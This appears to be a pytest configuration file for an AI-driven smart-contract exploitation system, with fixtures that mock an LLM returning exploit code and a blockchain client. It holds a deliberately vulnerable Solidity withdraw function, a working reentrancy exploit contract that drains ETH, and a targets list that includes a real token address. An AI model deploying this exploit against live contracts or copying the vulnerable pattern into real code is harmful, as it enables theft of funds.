"""
Test Configuration - A1 Agentic System

Pytest configuration and shared fixtures for the test suite.
"""

import pytest
import asyncio
import os
import tempfile
from pathlib import Path
from typing import Dict, Any
from unittest.mock import Mock, AsyncMock

TEST_CONFIG = {
    'LOG_LEVEL': 'DEBUG',
    'LOG_DIR': 'test_logs',
    'ENABLE_METRICS': True,
    'VALIDATION_LEVEL': 'basic',
    'ENABLE_FORGE_VALIDATION': False,  # Disable for unit tests
    'ENABLE_SECURITY_CHECKS': True,
    'STORAGE_DB_PATH': ':memory:',  # In-memory SQLite for tests
    'STORAGE_DATA_DIR': 'test_data',
    'MAX_VALIDATION_TIME': 10,
    'FORGE_TIMEOUT': 5
}

@pytest.fixture
def test_config():
    """Provide test configuration."""
    return TEST_CONFIG.copy()

@pytest.fixture
def temp_dir():
    """Provide temporary directory for tests."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)

@pytest.fixture
def mock_grok_api():
    """Mock Grok API responses."""
    mock = AsyncMock()
    mock.chat.completions.create.return_value = Mock(
        choices=[Mock(
            message=Mock(
                content="""```solidity
pragma solidity ^0.8.0;

contract TestExploit {
    function exploit() external payable {
        // Test exploit code
    }
}
```"""
            )
        )]
    )
    return mock

@pytest.fixture
def mock_blockchain_client():
    """Mock blockchain client."""
    mock = AsyncMock()
    mock.get_contract_source.return_value = {
        'source_code': 'contract Test {}',
        'abi': [],
        'compiler_version': '0.8.19'
    }
    mock.get_transaction_history.return_value = []
    mock.get_contract_balance.return_value = 1000000000000000000  # 1 ETH
    return mock

@pytest.fixture
def sample_contract_address():
    """Sample contract address for testing."""
    return "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"  # UNI token

@pytest.fixture
def sample_solidity_code():
    """Sample Solidity code for testing."""
    return """
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Vulnerable to reentrancy
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}
"""

@pytest.fixture
def sample_exploit_code():
    """Sample exploit code for testing."""
    return """
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ReentrancyExploit {
    VulnerableContract public target;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    
    constructor(address _target) {
        target = VulnerableContract(_target);
    }
    
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH");
        target.deposit{value: ATTACK_AMOUNT}();
        target.withdraw(ATTACK_AMOUNT);
    }
    
    receive() external payable {
        if (address(target).balance >= ATTACK_AMOUNT) {
            target.withdraw(ATTACK_AMOUNT);
        }
    }
}
"""

@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def mock_targets_file(temp_dir):
    """Create mock targets file."""
    targets_file = temp_dir / "targets.txt"
    targets_content = """0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984
0xA0b86a33E6441E6C8D3C8C8C8C8C8C8C8C8C8C8C
0xB0b86a33E6441E6C8D3C8C8C8C8C8C8C8C8C8C8C
"""
    targets_file.write_text(targets_content)
    return targets_file

@pytest.fixture(autouse=True)
def mock_env_vars(monkeypatch):
    """Mock environment variables for tests."""
    test_env = {
        'GROK_API_KEY': 'test-grok-key',
        'ETH_RPC_URL': 'https://test-eth-rpc.com',
        'BSC_RPC_URL': 'https://test-bsc-rpc.com',
        'ETHERSCAN_API_KEY': 'test-etherscan-key',
        'BSCSCAN_API_KEY': 'test-bscscan-key',
        'LOG_LEVEL': 'DEBUG'
    }
    
    for key, value in test_env.items():
        monkeypatch.setenv(key, value)
